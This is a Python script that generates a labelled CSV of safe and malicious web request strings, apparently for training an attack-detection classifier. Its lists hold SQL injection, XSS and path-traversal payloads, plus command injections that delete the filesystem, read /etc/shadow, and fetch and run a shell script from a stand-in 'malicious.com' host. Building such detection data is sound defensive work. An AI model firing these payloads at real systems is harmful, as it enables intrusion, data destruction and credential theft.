import pandas as pd
import random


# Function to generate payloads
def generate_payloads():
    safe_requests = [
        "normal payload", "safe input", "home page request", "user profile access",
        "search query: books", "page number 2", "hello world", "simple form data",
        "contact us page", "GET /index.html"
    ]

    sql_injections = [
        "' OR '1'='1'; --", "SELECT * FROM users WHERE username='admin' --",
        "UNION SELECT NULL, username, password FROM users --", "'; DROP TABLE users; --",
        "' OR '1'='1' LIMIT 1; --", "' OR 'a'='a'; --"
    ]

    xss_attacks = [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>", "<b onmouseover=alert('XSS')>hover me</b>",
        "<svg/onload=alert('XSS')>"
    ]

    command_injections = [
        "; rm -rf /", "; ls -la /etc/passwd", "&& reboot", "&& shutdown now",
        "| wget http://malicious.com/shell.sh | bash", "; cat /etc/shadow"
    ]

    path_traversals = [
        "../../etc/passwd", "../../../../../../var/log/auth.log",
        ".././.././../etc/shadow", "/../../../../windows/system32/config/sam"
    ]

    malicious_urls = [
        "http://malicious.com?name=<script>alert('Attack')</script>",
        "http://example.com/?redirect=http://evil.com",
        "https://fakebank.com/login?user=admin&pass=<script>steal</script>"
    ]

    # Generate dataset
    data = []
    labels = []

    for _ in range(10000):
        data.append(random.choice(safe_requests))
        labels.append(0)  # Safe payload

    for _ in range(8000):
        data.append(random.choice(sql_injections))
        labels.append(1)  # SQL Injection

    for _ in range(8000):
        data.append(random.choice(xss_attacks))
        labels.append(1)  # XSS

    for _ in range(8000):
        data.append(random.choice(command_injections))
        labels.append(1)  # Command Injection

    for _ in range(8000):
        data.append(random.choice(path_traversals))
        labels.append(1)  # Path Traversal

    for _ in range(8000):
        data.append(random.choice(malicious_urls))
        labels.append(1)  # Malicious URL

    return data, labels


# Generate dataset
requests, labels = generate_payloads()

# Create DataFrame
df = pd.DataFrame({'request_data': requests, 'label': labels})
df.to_csv('enhanced_dataset.csv', index=False)
print("5,000+ sample dataset created successfully!")
